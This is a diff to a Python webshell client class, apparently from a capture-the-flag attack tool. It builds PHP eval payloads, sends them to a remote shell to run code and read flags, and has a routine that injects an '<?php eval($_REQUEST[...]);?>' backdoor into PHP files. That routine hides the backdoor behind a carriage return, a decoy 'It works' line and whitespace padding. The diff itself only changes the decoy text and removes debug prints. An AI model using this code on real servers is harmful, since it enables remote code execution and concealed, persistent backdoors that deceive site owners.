@@ -35,12 +35,11 @@ class WebShell():
     def php_code_exec(self, code):
         # TODO : 自己实现这个函数
         key = random_string(8, string.ascii_letters)
-        god_code = "eval($_POST[%s])" % (key)
+        god_code = "eval($_POST[%s]);" % (key)
         code = "@ob_start('ob_gzip');" + code + "@ob_end_flush();"
         try:
             if self.method == "POST":
                 data = {self.password:god_code, key:code}
-                print data
                 response = requests.post(self.url, data=data)
             elif self.method == "GET":
                 params = {self.password:code}
@@ -48,7 +47,6 @@ class WebShell():
             else:
                 return (False, "Unsupported method!")
             content = response.text
-            print content
             return (True, content)
         except:
             Log.error("The connection is aborted!")
@@ -242,7 +240,6 @@ class WebShell():
         Log.info("Using token : [%s]" % (token))
         code = "echo '%s'; echo '%s'; echo '%s';" % (token, flag, token)
         result = self.php_code_exec(code)
-        print result
         if result[0]:
             content = result[1]
             for i in content.split(token):
@@ -573,7 +570,7 @@ class WebShell():
 
     def auto_inject_webshell(self, filename, password):
         webshell_content = "<?php eval($_REQUEST['%s']);?>" % (password)
-        fake_content = "<?php phpinfo();?>"
+        fake_content = "<?php print_r('It works');?>"
         padding = " " * (len(webshell_content) - len(fake_content))
         content = webshell_content + "\r" + fake_content + padding + "\n"
         self.auto_inject_phpfile(filename, content)
